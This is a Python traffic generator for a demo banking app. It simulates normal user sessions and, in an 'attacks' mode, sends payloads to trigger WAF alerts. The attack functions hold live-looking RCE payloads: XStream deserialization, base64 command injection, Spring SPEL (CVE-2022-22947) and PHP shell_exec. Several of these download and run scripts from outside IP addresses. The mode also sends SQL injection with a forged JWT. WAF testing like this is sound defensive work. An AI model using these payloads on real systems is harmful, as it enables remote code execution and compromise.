#!/usr/bin/env python3
"""
simulate_traffic.py – Arcadia Finance traffic generator
========================================================
Simulates realistic user sessions across all API endpoints to populate
WAF / Perf Mgmt / analytics statistics.

Usage:
    python3 simulate_traffic.py [--url http://localhost] [--loops 10] [--delay 1.5]

Requirements: Python 3.7+, stdlib only (no pip install needed).

Each "session" picks a random user, authenticates, then executes a realistic
sequence of API calls that mirrors what the browser SPA does:
  1.  POST /api/login
  2.  GET  /api/me
  3.  GET  /api/accounts
  4.  GET  /api/transfers?account=<checking>
  5.  GET  /api/users          (list all users)
  6.  GET  /api/users/<id>     (view another user – BOLA surface)
  7.  GET  /api/config
  8.  GET  /api/stocks/search?q=<ticker>
  9.  GET  /api/stocks/quote?ticker=<ticker>
  10. GET  /api/stocks/history?ticker=<ticker>&period=1mo
  11. GET  /api/stocks/portfolio
  12. GET  /api/stocks/orders
  13. POST /api/stocks/buy     (small qty, best-effort)
  14. POST /api/transfer       (small amount, best-effort)
  15. POST /api/logout
"""

import argparse
import json
import random
import time
import threading
import urllib.error
import urllib.request
from datetime import datetime

# ── Colours ───────────────────────────────────────────────────────────────────
RESET  = "\033[0m";  GREEN = "\033[32m";  YELLOW = "\033[33m"
RED    = "\033[31m"; CYAN  = "\033[36m";  BOLD   = "\033[1m";  DIM = "\033[2m"

def _ts():
    return datetime.now().strftime("%H:%M:%S")

def log_warn(msg):    print(f"  {YELLOW}⚠{RESET}  {msg}")
def log_err(msg):     print(f"  {RED}✖{RESET}  {msg}")
def log_section(msg): print(f"\n{BOLD}{CYAN}[{_ts()}] {msg}{RESET}")

# ── Seed data matching db/init.sql ────────────────────────────────────────────
USERS = [
    {"username": "alice",  "password": "alice123"},
    {"username": "thomas", "password": "thomas123"},
    {"username": "sophie", "password": "sophie123"},
    {"username": "lucas",  "password": "lucas123"},
]

# Account numbers per user (matching init.sql seed)
ACCOUNTS = {
    "alice":  ["FR7601234001001", "FR7601234001002", "FR7601234001003"],
    "thomas": ["FR7601234002001", "FR7601234002002"],
    "sophie": ["FR7601234003001", "FR7601234003002", "FR7601234003003"],
    "lucas":  ["FR7601234004001", "FR7601234004002"],
}

TICKERS = ["AAPL", "MSFT", "NVDA", "GOOGL", "AMZN", "FFIV", "TSLA", "META", "JPM", "V"]

TRANSFER_NOTES = [
    "Rent payment", "Grocery reimbursement", "Coffee ☕",
    "Team lunch", "Birthday gift 🎂", "Utility bill",
    "Subscription", "Trip expenses", "Invoice #2026",
]

# ── HTTP helpers (stdlib only) ────────────────────────────────────────────────

def _http(method, url, body=None, headers=None):
    """Returns (status_code, dict). Never raises on HTTP errors."""
    headers = headers or {}
    headers["x-traffic-gen"] = "allowed"
    headers["xff"]    = _random_ip()
    headers["Cookie"] = f"_imp_apg_r_={_random_did()}"
    data = json.dumps(body).encode() if body is not None else None
    if data:
        headers.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            raw = resp.read().decode()
            return resp.status, (json.loads(raw) if raw else {})
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:    body_json = json.loads(raw)
        except Exception: body_json = {"raw": raw}
        return e.code, body_json
    except Exception as exc:
        return 0, {"error": str(exc)}

def _http_bot(method, url, body=None, headers=None):
    """
    Identical to _http but deliberately omits x-traffic-gen.
    Used for bot-protection requests that must look like unmarked traffic
    so the WAF/bot-defence engine sees them without the allow-list marker.
    Still injects a random xff IP and _imp_apg_r_ cookie.
    """
    headers = headers or {}
    headers.setdefault("xff",    _random_ip())
    headers.setdefault("Cookie", f"_imp_apg_r_={_random_did()}")
    data = json.dumps(body).encode() if body is not None else None
    if data:
        headers.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            raw = resp.read().decode()
            return resp.status, (json.loads(raw) if raw else {})
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:    body_json = json.loads(raw)
        except Exception: body_json = {"raw": raw}
        return e.code, body_json
    except Exception as exc:
        return 0, {"error": str(exc)}

def _get(base, path, token):
    return _http("GET", base + path, headers={"Authorization": f"Bearer {token}"})

def _post(base, path, body, token=None):
    hdrs = {"Authorization": f"Bearer {token}"} if token else {}
    return _http("POST", base + path, body=body, headers=hdrs)

def _raw(method, url, body_bytes, headers=None):
    """
    Send a request with a raw (non-JSON) byte body.
    Used for attack simulation payloads that require text/plain bodies.
    SSL verification is disabled (equivalent to curl -k).
    Responses are discarded – only the status code is returned.
    """
    import ssl
    headers = headers or {}
    headers["x-traffic-gen"] = "allowed"
    req = urllib.request.Request(url, data=body_bytes, headers=headers, method=method)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
            resp.read()   # drain – output discarded like curl --output /dev/null
            return resp.status
    except urllib.error.HTTPError as e:
        e.read()
        return e.code
    except Exception:
        return 0

# ── Attack simulation helpers ─────────────────────────────────────────────────

def _random_ip():
    """Generate a random public-looking IPv4 address (avoids RFC-1918 ranges)."""
    while True:
        a = random.randint(1, 254)
        # Skip private / loopback / link-local ranges
        if a in (10, 127, 169, 172, 192):
            continue
        return f"{a}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def _random_did():
    """Generate a random 16-char hex device-id (mimics _imp_apg_r_ cookie value)."""
    return f"{random.getrandbits(64):016x}"

def _fake_jwt():
    """
    Build a structurally valid HS256 JWT that matches the app's token format
    (sub, username, iat, exp) but is signed with a random secret, so the
    server rejects it with 401 — realistic for a forged-token attack probe.
    Uses stdlib only (base64, json, hmac, hashlib).
    """
    import base64, hmac, hashlib, time as _time

    def _b64(data):
        if isinstance(data, dict):
            data = json.dumps(data, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    header  = {"alg": "HS256", "typ": "JWT"}
    now     = int(_time.time())
    payload = {
        "sub":      random.randint(1, 9999),
        "username": random.choice([u["username"] for u in USERS]),
        "iat":      now,
        "exp":      now + 28800,   # 8 h — matches JWT_EXPIRY_HOURS in app.py
    }
    signing_input = f"{_b64(header)}.{_b64(payload)}".encode()
    # Random 32-byte secret → signature will be invalid on the server
    fake_secret   = random.getrandbits(256).to_bytes(32, "big")
    sig = base64.urlsafe_b64encode(
        hmac.new(fake_secret, signing_input, hashlib.sha256).digest()
    ).rstrip(b"=").decode()
    return f"{signing_input.decode()}.{sig}"

# ── Step logger ───────────────────────────────────────────────────────────────

def step(label, status, data, expected=200):
    ok = (status == expected)
    m  = f"{GREEN}✔{RESET}" if ok else f"{RED}✖{RESET}"
    detail = f"  → {DIM}{data}{RESET}" if not ok else ""
    print(f"    {m}  [{status}] {label}{detail}")
    return ok

# ── Attack simulation ─────────────────────────────────────────────────────────

def simulate_attacks(base_url, session_id, delay):
    """
    Fire a set of synthetic attack requests against base_url to trigger WAF alerts.

    Attacks covered:
      A1 – Credential stuffing          POST /logon.aspx
      A2 – Java XStream RCE             POST /api/2.0/services/usermgmt/password/<user>
      A3 – Command injection (base64)   POST /api/stocks
      A4 – Spring Cloud Gateway SPEL    POST /actuator/gateway/routes/<id>
      A5 – PHP RCE via callback param   GET  /nette.micro/
      A6 - SQL injection via transfer   POST /api/transfer

    All requests:
      • carry x-traffic-gen: allowed (via _raw)
      • use a randomly picked spoofed IP in the xff header
      • use a randomly picked device-id in the _imp_apg_r_ cookie
      • follow redirects (urllib handles 3xx automatically)
      • discard the response body (--output /dev/null equivalent)
      • ignore TLS errors (curl -k equivalent)
    """
    ip  = _random_ip()
    did = _random_did()
    # Build common headers shared by all five attacks
    common = {
        "Cookie": f"_imp_apg_r_={did}",
        "xff":    ip,
    }

    log_section(f"Attacks #{session_id:03d} — xff={ip}  did={did[:8]}…")

    # ── A1: Credential stuffing – POST /logon.aspx ────────────────────────────
    # Mimics a bot submitting a stolen password to an ASP.NET login form.
    status = _raw(
        "POST",
        f"{base_url}/logon.aspx",
        body_bytes=b"password=7ux4398!",
        headers={**common, "Content-Type": "text/plain"},
    )
    print(f"    {'✔' if status else '–'}  [{status or '---'}] POST /logon.aspx"
          f"  (credential stuffing)")
    time.sleep(delay * random.uniform(0.3, 0.8))

    # ── A2: Java XStream deserialization RCE ──────────────────────────────────
    # Targets NSX-T / vCenter-style REST APIs that deserialize XStream XML.
    # Payload triggers a ProcessBuilder executing a DNS-callback ping to
    # an OAST (Out-of-band Application Security Testing) collector.
    xstream_payload = (
        b"<sorted-set>\n"
        b"  <string>foo</string>\n"
        b"  <dynamic-proxy>\n"
        b"    <interface>java.lang.Comparable</interface>\n"
        b"    <handler class=\"java.beans.EventHandler\">\n"
        b"      <target class=\"java.lang.ProcessBuilder\">\n"
        b"        <command>\n"
        b"          <string>bash</string>\n"
        b"          <string>-c</string>\n"
        b"          <string>ping -c 3 lin.cf9dm0fs8ool8a000010gjuidsfa7s5ea.oast.site</string>\n"
        b"        </command>\n"
        b"      </target>\n"
        b"      <action>start</action>\n"
        b"    </handler>\n"
        b"  </dynamic-proxy>\n"
        b"</sorted-set>"
    )
    status = _raw(
        "POST",
        f"{base_url}/api/2.0/services/usermgmt/password/aiitzf",
        body_bytes=xstream_payload,
        headers={**common, "Content-Type": "text/plain"},
    )
    print(f"    {'✔' if status else '–'}  [{status or '---'}]"
          f" POST /api/2.0/services/usermgmt/password/aiitzf  (XStream RCE)")
    time.sleep(delay * random.uniform(0.3, 0.8))

    # ── A3: Command injection via backtick + base64 reverse shell ─────────────
    # The base64 string decodes to: cd /tmp || cd /mnt || cd /root || cd /;
    # curl -O http://176.65.137.5/zero.sh; chmod 777 zero.sh; sh zero.sh &
    # Sent as a doAs parameter with backtick shell substitution.
    cmd_injection_payload = (
        b"doAs=`echo Y2QgL3RtcCB8fCBjZCAvbW50IHx8ICBjZCAvcm9vdCB8fCBjZCAvOyBjdXJsIC1PIGh0"
        b"dHA6Ly8xNzYuNjUuMTM3LjUvemVyby5zaDsgY2htb2QgNzc3IHplcm8uc2g7IHNoIHplcm8uc2ggJg=="
        b" | base64 -d | bash`"
    )
    status = _raw(
        "POST",
        f"{base_url}/api/stocks",
        body_bytes=cmd_injection_payload,
        headers={**common, "Content-Type": "text/plain"},
    )
    print(f"    {'✔' if status else '–'}  [{status or '---'}]"
          f" POST /api/stocks  (command injection / base64 reverse shell)")
    time.sleep(delay * random.uniform(0.3, 0.8))

    # ── A4: Spring Cloud Gateway SPEL RCE (CVE-2022-22947) ───────────────────
    # Creates a malicious gateway route whose AddResponseHeader filter embeds a
    # SPEL expression that executes an arbitrary shell command via Runtime.exec().
    spel_payload = (
        b'{"id": "wgcmiami", "filters": [{"name": "AddResponseHeader", "args": '
        b'{"name": "Result", "value": "#{new String(T(org.springframework.util.'
        b'StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('
        b'"wget -qO - http://80.68.196.6/ff|perl").getInputStream()))}"}}], '
        b'"uri": "http://example.com"}'
    )
    status = _raw(
        "POST",
        f"{base_url}/actuator/gateway/routes/wgcmiami",
        body_bytes=spel_payload,
        headers={**common, "Content-Type": "text/plain"},
    )
    print(f"    {'✔' if status else '–'}  [{status or '---'}]"
          f" POST /actuator/gateway/routes/wgcmiami  (Spring SPEL RCE)")
    time.sleep(delay * random.uniform(0.3, 0.8))

    # ── A5: PHP RCE via Nette Framework callback parameter ────────────────────
    # Abuses the ?callback= parameter to invoke shell_exec() with a URL-encoded
    # command that downloads and executes a remote shell script.
    php_rce_path = (
        "/nette.micro/?callback=shell_exec"
        "&cmd=cd%2520%2Ftmp%3Bwget%2520http%3A%2F%2F155.94.128.95%2Fohshit.sh"
        "%3Bcurl%2520-O%2520http%3A%2F%2F155.94.128.95%2Fohshit.sh"
        "%3Bchmod%2520777%2520ohshit.sh%3Bsh%2520ohshit.sh"
    )
    status = _raw(
        "GET",
        f"{base_url}{php_rce_path}",
        body_bytes=None,
        headers={**common},
    )
    print(f"    {'✔' if status else '–'}  [{status or '---'}]"
          f" GET  /nette.micro/?callback=shell_exec  (PHP RCE)")
    time.sleep(delay * random.uniform(0.3, 0.8))

    # ── A6: SQL injection via transfer note field ─────────────────────────────
    # Injects a classic ' or 1=1# payload into the note field of a transfer
    # request to probe for unsanitised SQL concatenation on the backend.
    # Sent as raw bytes so the single-quote is never re-encoded or escaped.
    # A structurally valid but incorrectly signed JWT is attached to mimic a
    # real authenticated request carrying a forged token.
    sqli_payload = (
        b'{"from_account": "FR7601234001001", "to_account": "FR7601234002001",'
        b' "amount": 250.0, "note": "\' or 1=1#"}'
    )
    status = _raw(
        "POST",
        f"{base_url}/api/transfer",
        body_bytes=sqli_payload,
        headers={**common, "Content-Type": "application/json",
                 "Authorization": f"Bearer {_fake_jwt()}"},
    )
    print(f"    {'✔' if status else '–'}  [{status or '---'}]"
          f" POST /api/transfer  (SQL injection in note field)")

    print(f"    {DIM}── 6 attack probes fired{RESET}")

# ── Bot protection simulation ─────────────────────────────────────────────────

def simulate_bot_protection(base_url, session_id, delay):
    """
    Fire requests that should trigger bot-protection detection.

    These requests intentionally omit the x-traffic-gen header so they
    arrive at the WAF as unmarked traffic — indistinguishable from a real
    automated bot.  The random xff IP and _imp_apg_r_ cookie are still
    injected (via _http_bot) to vary the fingerprint per iteration.

    Probes covered:
      B1 – Automated login attempt  POST /api/login
    """
    ip  = _random_ip()
    did = _random_did()

    log_section(f"Bot Protection #{session_id:03d} — xff={ip}  did={did[:8]}…")

    # ── B1: Automated login attempt ───────────────────────────────────────────
    # Simulates a bot performing a login without the x-traffic-gen allow-list
    # marker, as a real credential-stuffing / scripted bot would appear.
    status, data = _http_bot(
        "POST",
        f"{base_url}/api/login",
        body={"username": "thomas", "password": "thomas123"},
        headers={"Content-Type": "application/json",
                 "xff": ip, "Cookie": f"_imp_apg_r_={did}"},
    )
    print(f"    {'✔' if status == 200 else '–'}  [{status or '---'}]"
          f" POST /api/login  (automated login – no x-traffic-gen)")

    print(f"    {DIM}── 1 bot probe fired{RESET}")

# ── Session simulation ────────────────────────────────────────────────────────

def simulate_session(base_url, user, session_id, delay):
    """Run one complete user session. Returns count of successful API calls."""
    username = user["username"]
    accounts = list(ACCOUNTS[username])
    ticker   = random.choice(TICKERS)
    successes = 0

    log_section(f"Session #{session_id:03d} — {BOLD}{username}{RESET}")

    # 1. Login
    status, data = _post(base_url, "/api/login",
                         {"username": username, "password": user["password"]})
    ok = step("POST /api/login", status, data)
    if not ok:
        log_err(f"Login failed for {username} – skipping session")
        return 0
    token = data.get("access_token", "")
    successes += 1
    time.sleep(delay * random.uniform(0.5, 1.5))

    # 2. /me
    status, data = _get(base_url, "/api/me", token)
    if step("GET  /api/me", status, data): successes += 1
    time.sleep(delay * random.uniform(0.3, 1.0))

    # 3. Accounts (refresh list from live response)
    status, data = _get(base_url, "/api/accounts", token)
    if step("GET  /api/accounts", status, data):
        successes += 1
        if isinstance(data, list) and data:
            accounts = [a["account_number"] for a in data]
    time.sleep(delay * random.uniform(0.3, 1.0))

    # 4. Transfer history for primary account
    checking = accounts[0]
    status, data = _get(base_url, f"/api/transfers?account={checking}", token)
    if step(f"GET  /api/transfers?account={checking}", status, data): successes += 1
    time.sleep(delay * random.uniform(0.3, 1.0))

    # 5. List all users
    status, data = _get(base_url, "/api/users", token)
    if step("GET  /api/users", status, data): successes += 1
    time.sleep(delay * random.uniform(0.2, 0.8))

    """
    # 6. Fetch another user's profile (BOLA surface)
    # IDs 1-4   = real app users (alice, thomas, sophie, lucas)
    # IDs 5-104 = BOLA target users seeded in db/init.sql
    user_idx = USERS.index(user) + 1           # 1-based id of current user
    bola_pool = [i for i in range(1, 105) if i != user_idx]
    other_id  = random.choice(bola_pool)
    status, data = _get(base_url, f"/api/users/{other_id}", token)
    if step(f"GET  /api/users/{other_id} (BOLA surface)", status, data): successes += 1
    time.sleep(delay * random.uniform(0.2, 0.8))
    """
    
    # 7. App config
    status, data = _get(base_url, "/api/config", token)
    if step("GET  /api/config", status, data): successes += 1
    time.sleep(delay * random.uniform(0.2, 0.6))

    # 8. Stock search
    status, data = _get(base_url, f"/api/stocks/search?q={ticker}", token)
    if step(f"GET  /api/stocks/search?q={ticker}", status, data): successes += 1
    time.sleep(delay * random.uniform(0.5, 1.5))

    # 9. Stock quote
    status, data = _get(base_url, f"/api/stocks/quote?ticker={ticker}", token)
    if step(f"GET  /api/stocks/quote?ticker={ticker}", status, data): successes += 1
    time.sleep(delay * random.uniform(0.5, 1.5))

    # 10. Stock history
    period   = random.choice(["1mo", "3mo", "6mo", "1y"])
    interval = random.choice(["1d", "1wk"])
    status, data = _get(base_url,
        f"/api/stocks/history?ticker={ticker}&period={period}&interval={interval}", token)
    if step(f"GET  /api/stocks/history?ticker={ticker}&period={period}", status, data):
        successes += 1
    time.sleep(delay * random.uniform(0.5, 1.5))

    # 11. Portfolio
    status, data = _get(base_url, "/api/stocks/portfolio", token)
    if step("GET  /api/stocks/portfolio", status, data): successes += 1
    time.sleep(delay * random.uniform(0.3, 0.8))

    # 12. Orders
    status, data = _get(base_url, "/api/stocks/orders", token)
    if step("GET  /api/stocks/orders", status, data): successes += 1
    time.sleep(delay * random.uniform(0.3, 0.8))

    # 13. Buy stock – tiny fractional quantity to stay within balance
    inv_account = next((a for a in accounts if a.endswith("003")), accounts[0])
    buy_qty = round(random.uniform(0.01, 0.1), 2)
    status, data = _post(base_url, "/api/stocks/buy",
                         {"ticker": ticker, "quantity": buy_qty,
                          "from_account": inv_account}, token=token)
    if status == 200:
        if step(f"POST /api/stocks/buy ({buy_qty}× {ticker})", status, data): successes += 1
    else:
        log_warn(f"POST /api/stocks/buy [{status}] – {data.get('error', data)}")
    time.sleep(delay * random.uniform(0.5, 1.5))

    # 14. Transfer between own accounts
    if len(accounts) >= 2:
        from_acc, to_acc = accounts[0], accounts[1]
        amount = round(random.uniform(1.0, 50.0), 2)
        note   = random.choice(TRANSFER_NOTES)
        status, data = _post(base_url, "/api/transfer",
                             {"from_account": from_acc, "to_account": to_acc,
                              "amount": amount, "note": note}, token=token)
        if status == 200:
            if step(f"POST /api/transfer (€{amount} {from_acc}→{to_acc})", status, data):
                successes += 1
        else:
            log_warn(f"POST /api/transfer [{status}] – {data.get('error', data)}")
        time.sleep(delay * random.uniform(0.5, 1.5))

    # 15. Logout
    status, data = _post(base_url, "/api/logout", {}, token=token)
    if step("POST /api/logout", status, data): successes += 1

    print(f"    {DIM}── {successes} calls succeeded{RESET}")
    return successes

# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Arcadia Finance traffic generator",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--url",     default="http://localhost",
                        help="Base URL of the main-app (no trailing slash)")
    parser.add_argument("--loops",   type=int, default=10,
                        help="Total number of sessions to simulate")
    parser.add_argument("--delay",   type=float, default=1.5,
                        help="Base inter-request delay in seconds (randomised ±50%%)")
    parser.add_argument("--threads", type=int, default=1,
                        help="Parallel sessions (>1 for burst / load traffic)")
    parser.add_argument("--user",    default=None,
                        choices=[u["username"] for u in USERS],
                        help="Pin all sessions to a specific user (default: random)")
    parser.add_argument("--mode",
                        nargs="+",
                        default=["good-traffic"],
                        metavar="MODE",
                        help=(
                            "One or more modes, space- or comma-separated: "
                            "good-traffic, attacks, bots. "
                            "Examples: --mode attacks  "
                            "--mode good-traffic attacks  "
                            "--mode attacks,bots"
                        ))
    args = parser.parse_args()

    base = args.url.rstrip("/")

    # Normalise: flatten comma-separated values and deduplicate
    VALID_MODES = {"good-traffic", "attacks", "bots"}
    raw_modes = []
    for token in args.mode:
        raw_modes.extend(token.split(","))
    modes = []
    for m in raw_modes:
        m = m.strip()
        if not m:
            continue
        if m not in VALID_MODES:
            parser.error(f"invalid mode '{m}' – choose from: {', '.join(sorted(VALID_MODES))}")
        if m not in modes:
            modes.append(m)

    MODE_COLOUR = {
        "good-traffic": GREEN  + "good-traffic" + RESET,
        "attacks":      YELLOW + "attacks"       + RESET,
        "bots":         YELLOW + "bots"          + RESET,
    }
    mode_label = " + ".join(MODE_COLOUR[m] for m in modes)

    print(f"\n{BOLD}{'═'*60}{RESET}")
    print(f"{BOLD}  Arcadia Finance — Traffic Generator{RESET}")
    print(f"{'═'*60}")
    print(f"  Target  : {CYAN}{base}{RESET}")
    print(f"  Sessions: {args.loops}  |  Threads: {args.threads}  |  Delay: {args.delay}s")
    print(f"  Mode    : {mode_label}")
    print(f"{'═'*60}\n")

    total_calls = 0
    lock = threading.Lock()

    def run_session(i):
        nonlocal total_calls
        calls = 0
        if "good-traffic" in modes:
            user = (next(u for u in USERS if u["username"] == args.user)
                    if args.user else random.choice(USERS))
            calls = simulate_session(base, user, i + 1, args.delay)
        if "attacks" in modes:
            simulate_attacks(base, i + 1, args.delay)
        if "bots" in modes:
            simulate_bot_protection(base, i + 1, args.delay)
        with lock:
            total_calls += calls

    if args.threads == 1:
        for i in range(args.loops):
            run_session(i)
    else:
        active = []
        for i in range(args.loops):
            # Wait until a thread slot is free
            while len([t for t in active if t.is_alive()]) >= args.threads:
                time.sleep(0.1)
            t = threading.Thread(target=run_session, args=(i,), daemon=True)
            t.start()
            active.append(t)
            time.sleep(args.delay * 0.3)   # stagger starts
        for t in active:
            t.join()

    print(f"\n{BOLD}{'═'*60}{RESET}")
    print(f"{BOLD}  Done — {total_calls} API calls succeeded across {args.loops} sessions.{RESET}")
    print(f"{'═'*60}\n")


if __name__ == "__main__":
    main()
